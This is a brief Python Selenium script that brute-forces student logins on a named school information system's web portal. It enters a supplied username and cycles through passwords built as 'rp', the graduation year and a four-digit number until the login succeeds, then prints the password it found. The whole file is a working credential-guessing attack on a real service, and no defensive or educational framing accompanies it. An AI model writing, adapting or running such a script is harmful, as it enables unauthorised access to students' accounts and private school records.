from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
import time
from selenium.common.exceptions import NoSuchElementException

browser = webdriver.Chrome(executable_path=r"C:\Users\abdel\Downloads\chromedriver_win32\chromedriver.exe")
browser.get('https://sdm.sisk12.com/RP360x3/login')
time.sleep(1)

student = browser.find_element_by_id("mat-tab-label-0-2")
student.click()

num = str(0000).zfill(4)
name = input("enter username here: ")
year = input("enter grad year here: ")


while browser.current_url == ("https://sdm.sisk12.com/RP360x3/login"):
    try:
        username = browser.find_element_by_id("txtUserName")
        username.clear()
        username.send_keys(name)
    except NoSuchElementException:
        pass

    try:
        password = browser.find_element_by_id("txtPassword")
        password.clear()
        password.send_keys("rp" + year + str(num).zfill(4))
        password.send_keys(Keys.RETURN)
    except NoSuchElementException:
        pass

    print (str(num).zfill(4))
    num = int(num) + 1
    time.sleep(1)

num = int(num) - 2
print("The password is:" + "rp" + year + str(num).zfill(4))
